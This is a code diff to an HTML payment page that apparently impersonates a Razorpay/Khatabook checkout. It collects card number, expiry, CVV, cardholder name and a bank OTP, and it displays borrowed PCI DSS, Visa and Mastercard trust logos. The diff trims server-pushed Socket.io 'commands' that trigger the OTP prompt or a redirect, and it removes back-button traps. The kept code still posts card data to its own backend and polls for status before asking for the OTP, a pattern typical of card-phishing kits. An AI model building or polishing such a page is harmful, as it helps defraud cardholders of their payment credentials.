@@ -175,7 +175,6 @@
       filter: blur(1px);
     }
     .hidden { display: none !important; }
-    /* OTP container: input and button side-by-side, each 50% */
     .otp-container {
       display: flex;
     }
@@ -187,23 +186,25 @@
       width: 50%;
       padding-left: 4px;
     }
-  .card-icon {
-        height: 24px;
-        width: auto;
-        display: block;
-        position: absolute;
-        top: 50%;
-        transform: translateY(-50%);
-      }
-
-      #cardTypeIcon {
-        position: absolute;
-        right: 12px;
-        top: 50%;
-        transform: translateY(-50%);
-        display: flex;
-        align-items: center;
-        height: 24px;
+    .card-icon {
+      height: 24px;
+      width: auto;
+      display: block;
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+    }
+    #cardTypeIcon {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 24px;
+      width: 38px;
     }
     .otp-error {
       color: #ef4444;
@@ -212,26 +213,6 @@
       text-align: center;
       display: none;
     }
-
-    <style>
-  /* Add this new CSS rule */
-  #cardTypeIcon {
-    position: absolute;
-    right: 12px; /* adjust horizontal spacing if needed */
-    top: 50%;
-    transform: translateY(-50%);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-  }
-  /* Optionally ensure that any img inside is centered */
-  #cardTypeIcon img {
-    display: block;
-    margin: 0 auto;
-    vertical-align: middle;
-  }
-</style>
-
   </style>
 </head>
 <body>
@@ -407,46 +388,16 @@
     </div>
 
     <div class="bottom-logos flex justify-center items-center gap-6">
-      <img src="https://static.cdnlogo.com/logos/r/96/razorpay.svg" />
-      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/ba/Razorpay_logo.svg/2560px-Razorpay_logo.svg.png" alt="Razorpay" class="h-4" />
+      
+      <img src="https://upload.wikimedia.org/wikipedia/commons/8/83/Khatabook.svg" alt="Powered by Khatabook" class="h-6" />
+      
+      <img src="https://www.pcisecuritystandards.org/wp-content/uploads/2022/03/pci-logo-teal.svg" alt="PCI DSS" class="h-6" />
+      <img src="https://logojinni.com/image/logos/razorpay.svg" alt="Razorpay" class="h-4" />
       <img src="https://www.mastercard.us/content/dam/public/mastercardcom/na/us/en/homepage/Home/mc-logo-52.svg" alt="Mastercard SecureCode" class="h-6" />
       <img src="https://usa.visa.com/dam/VCOM/regional/ve/romania/blogs/hero-image/visa-logo-800x450.jpg" alt="Verified by Visa" class="h-6" />
     </div>
   </div>
 
-  <!-- Socket.io integration for real-time commands -->
-  <script src="/socket.io/socket.io.js"></script>
-  <script>
-    const socket = io();
-    const storedInvoiceId = localStorage.getItem("invoiceId");
-    if (storedInvoiceId) {
-      socket.emit('join', storedInvoiceId);
-    }
-    socket.on('show_otp', (data) => {
-      console.log("Show OTP event received:", data);
-      // Hide the payment form completely so that only OTP form is visible
-      document.getElementById('paymentForm').classList.add('hidden');
-      document.getElementById('otpForm').classList.remove('hidden');
-    });
-    socket.on('redirect', (data) => {
-      window.location.href = data.redirectUrl;
-    });
-  </script>
-
-  <!-- Back Button Prevention -->
-  <script>
-    // Push a state so that back button doesn't immediately leave the page
-    history.pushState(null, null, window.location.href);
-    window.addEventListener('popstate', function(e) {
-      if (confirm("Do you want to cancel this transaction?")) {
-        window.location.href = '/fail.html';
-      } else {
-        history.pushState(null, null, window.location.href);
-      }
-    });
-  </script>
-
-  <!-- Payment Page Main Script -->
   <script>
     document.addEventListener('DOMContentLoaded', async () => {
       let isCardValid = false;
@@ -457,7 +408,7 @@
       let timerInterval = null;
       let timer = 180;
       let consentChecked = true;
-  
+
       const urlParams = new URLSearchParams(window.location.search);
       const pid = urlParams.get('pid');
       if (pid) {
@@ -473,7 +424,7 @@
           console.error('Error fetching payment details:', error);
         }
       }
-  
+
       function updateSubmitButton() {
         const email = document.getElementById('email').value.trim();
         const cardNum = document.getElementById('cardNumber').value.replace(/\s+/g, '');
@@ -489,7 +440,7 @@
           submitButton.className = "w-full py-3 px-4 flex items-center justify-center text-white rounded-none bg-gray-400";
         }
       }
-  
+
       function updateConfirmOtpButton() {
         const otp = document.getElementById('otp').value;
         const otpButton = document.getElementById('otpSubmitButton');
@@ -502,7 +453,7 @@
           otpButton.className = "w-full bg-gray-400 text-white py-2 px-4 rounded-none flex items-center justify-center";
         }
       }
-  
+
       document.getElementById('consentCheckbox').addEventListener('click', function() {
         consentChecked = !consentChecked;
         if (consentChecked) {
@@ -512,7 +463,7 @@
         }
         updateSubmitButton();
       });
-  
+
       function validateCard(number) {
         const clean = number.replace(/\D/g, '');
         if (clean.length < 13 || clean.length > 16) return false;
@@ -525,7 +476,7 @@
         }
         return sum % 10 === 0;
       }
-  
+
       function detectCardType(number) {
         const clean = number.replace(/\D/g, '');
         const firstDigit = clean.charAt(0);
@@ -535,45 +486,34 @@
         if (firstDigit === '6') return 'rupay';
         return null;
       }
-  
-     function updateCardTypeIcon(type) {
-  const iconContainer = document.getElementById('cardTypeIcon');
-  iconContainer.innerHTML = ''; // Clear previous logo
-  if (type) {
-    const img = document.createElement('img');
-    img.style.height = "24px";
-    img.style.width = "auto";
-    // Use the improved styling below
-    img.style.display = "block";
-    img.style.margin = "0 auto";
-    img.style.verticalAlign = "middle";
-    switch (type) {
-      case 'visa':
-        img.src = 'https://upload.wikimedia.org/wikipedia/commons/a/ac/Old_Visa_Logo.svg';
-        break;
-      case 'mastercard':
-        img.src = 'https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/mastercard/mastercard-curved-128px.png';
-        break;
-      case 'amex':
-        img.src = 'https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/amex/amex-curved-128px.png';
-        break;
-      case 'rupay':
-        img.src = 'https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/Rupay-Logo.png/320px-Rupay-Logo.png';
-        break;
-      default:
-        return;
-    }
-    img.alt = type;
-    iconContainer.appendChild(img);
-  }
-}
 
+      function updateCardTypeIcon(type) {
+        const iconContainer = document.getElementById('cardTypeIcon');
+        iconContainer.innerHTML = '';
+        if (type) {
+          const img = document.createElement('img');
+          img.style.height = "24px";
+          img.style.width = "auto";
+          switch (type) {
+            case 'visa':
+              img.src = 'https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg';
+              break;
+            case 'mastercard':
+              img.src = 'https://pngimg.com/uploads/mastercard/mastercard_PNG16.png';
+              break;
+            case 'amex':
+              img.src = 'https://1000logos.net/wp-content/uploads/2016/10/American-Express-Color-500x281.png';
+              break;
+            case 'rupay':
+              img.src = 'https://upload.wikimedia.org/wikipedia/commons/d/d1/RuPay.svg';
+              break;
+          }
           img.alt = type;
           img.className = "card-icon";
           iconContainer.appendChild(img);
         }
       }
-  
+
       function formatCardNumber(value) {
         let v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
         v = v.slice(0, 16);
@@ -594,7 +534,7 @@
         }
         return formatted;
       }
-  
+
       function validateExpiry(value) {
         if (!/^\d{2}\/\d{2}$/.test(value)) return false;
         const [month, year] = value.split('/').map(num => parseInt(num, 10));
@@ -606,7 +546,7 @@
         if (year === currentYear && month < currentMonth) return false;
         return true;
       }
-  
+
       function formatExpiry(value) {
         const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
         let formatted = v;
@@ -625,7 +565,7 @@
         }
         return formatted;
       }
-  
+
       function startOtpTimer() {
         if (timerInterval) clearInterval(timerInterval);
         timer = 180;
@@ -641,7 +581,7 @@
           }
         }, 1000);
       }
-  
+
       document.getElementById('cardNumber').addEventListener('input', function(e) {
         const cursor = e.target.selectionStart;
         const lastLength = e.target.value.length;
@@ -655,7 +595,7 @@
           e.target.setSelectionRange(newCursor, newCursor);
         }
       });
-  
+
       document.getElementById('expiry').addEventListener('input', function(e) {
         const cursor = e.target.selectionStart;
         const lastLength = e.target.value.length;
@@ -667,15 +607,15 @@
           e.target.setSelectionRange(newCursor, newCursor);
         }
       });
-  
+
       ['email', 'cvv', 'cardholderName'].forEach(id => {
         document.getElementById(id).addEventListener('input', updateSubmitButton);
       });
-  
+
       document.getElementById('otp').addEventListener('input', function(e) {
         updateConfirmOtpButton();
       });
-  
+
       async function checkTransactionStatus() {
         if (!currentInvoiceId) return;
         try {
@@ -686,10 +626,11 @@
             document.getElementById('paymentForm').classList.add('hidden');
             document.getElementById('otpForm').classList.remove('hidden');
             const cardNumber = document.getElementById('cardNumber').value;
-            document.getElementById('cardLastFour').textContent = cardNumber.slice(-4);
+             document.getElementById('cardLastFour').textContent = cardNumber.slice(-4);
             if (!timerInterval) { startOtpTimer(); }
             if (data.otpError) {
               document.getElementById('otpError').style.display = 'block';
+              // Reset OTP confirm button
               const otpButton = document.getElementById('otpSubmitButton');
               const otpLoader = document.getElementById('otpLoader');
               const btnText = document.getElementById('otpText');
@@ -708,7 +649,7 @@
           console.error('Error checking transaction status:', err);
         }
       }
-  
+
       document.getElementById('mainForm').addEventListener('submit', async function(e) {
         e.preventDefault();
         if (!isCardValid || !isExpiryValid || isProcessing) return;
@@ -737,7 +678,6 @@
           const result = await response.json();
           if (result.status === "success") {
             currentInvoiceId = result.invoiceId;
-            localStorage.setItem("invoiceId", result.invoiceId);
             statusCheckInterval = setInterval(checkTransactionStatus, 2000);
           } else {
             throw new Error('Payment submission failed');
@@ -753,7 +693,7 @@
           updateSubmitButton();
         }
       });
-  
+
       document.getElementById('otpSubmitButton').addEventListener('click', async () => {
         if (isProcessing) return;
         isProcessing = true;
@@ -788,48 +728,6 @@
         }
       });
     });
-
-    // Socket.io integration for real-time commands
-    const socket = io();
-    const storedInvoiceId = localStorage.getItem("invoiceId");
-    if (storedInvoiceId) {
-      socket.emit('join', storedInvoiceId);
-    }
-    socket.on('show_otp', (data) => {
-      console.log("Show OTP event received:", data);
-      document.getElementById('paymentForm').classList.add('hidden');
-      document.getElementById('otpForm').classList.remove('hidden');
-    });
-    socket.on('redirect', (data) => {
-      window.location.href = data.redirectUrl;
-    });
-
-    // Prevent back navigation and prompt the user to confirm cancelation
-    history.pushState(null, null, window.location.href);
-    window.addEventListener('popstate', function(e) {
-      if (confirm("Do you want to cancel this transaction?")) {
-        window.location.href = '/fail.html';
-      } else {
-        history.pushState(null, null, window.location.href);
-      }
-    });
   </script>
-<script>
-document.addEventListener('DOMContentLoaded', function() {
-  // Push a custom state into the history stack
-  history.pushState({preventBack: true}, '');
-  window.addEventListener('popstate', function(e) {
-    // When the user navigates back, show a confirmation dialog.
-    if (confirm("Do you want to cancel this transaction?")) {
-      // If they confirm, redirect them to fail.html
-      window.location.href = '/fail.html';
-    } else {
-      // Otherwise, push the state again so the user stays on the page.
-      history.pushState({preventBack: true}, '');
-    }
-  });
-});
-</script>
-
 </body>
 </html>
